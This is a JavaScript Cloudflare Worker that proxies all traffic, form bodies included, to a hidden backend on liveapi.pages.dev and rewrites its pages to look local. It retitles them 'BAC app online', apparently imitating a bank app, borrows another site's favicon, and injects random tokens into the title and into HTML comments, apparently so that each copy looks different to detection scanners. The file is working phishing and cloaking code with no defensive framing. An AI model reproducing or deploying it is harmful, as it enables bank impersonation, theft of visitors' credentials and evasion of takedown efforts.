addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const targetUrl = 'https://liveapi.pages.dev/'

  const url = new URL(request.url)
  url.hostname = new URL(targetUrl).hostname
  url.protocol = new URL(targetUrl).protocol

  const newRequest = new Request(url, {
    method: request.method,
    headers: new Headers({
      ...request.headers,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br'
    }),
    body: request.body,
    redirect: request.redirect
  })

  const response = await fetch(newRequest)

  const responseClone = response.clone()

  const contentType = response.headers.get('Content-Type') || ''
  if (contentType.includes('text/html')) {
    let text = await responseClone.text()

    const currentHostname = new URL(request.url).hostname
    const targetHostname = new URL(targetUrl).hostname
    text = text.replace(new RegExp(targetHostname, 'g'), currentHostname)

    const titleToken = generateRandomToken(16)

    const titles = [
      "BAC app online",
    ]
    const randomTitle = titles[Math.floor(Math.random() * titles.length)]

    text = text.replace(/<title>.*?<\/title>/, `<title>${randomTitle} - ${titleToken}</title>`)

    // Reemplazar el icono
    text = text.replace(/<link rel="icon" .*?>/i, `<link rel="icon" href="https://researchforevidence.fhi360.org/wp-content/uploads/2017/01/favicon.ico">`)

    const commentToken = generateRandomToken(254)
    text = `<!-- Token: ${commentToken} -->\n` + text + `\n<!-- Token: ${commentToken} -->`

    return new Response(text, {
      headers: response.headers
    })
  }

  return response
}

function generateRandomToken(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let token = ''
  for (let i = 0; i < length; i++) {
    token += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return token
}

function log(label, data) {
  console.log(label, data)
}
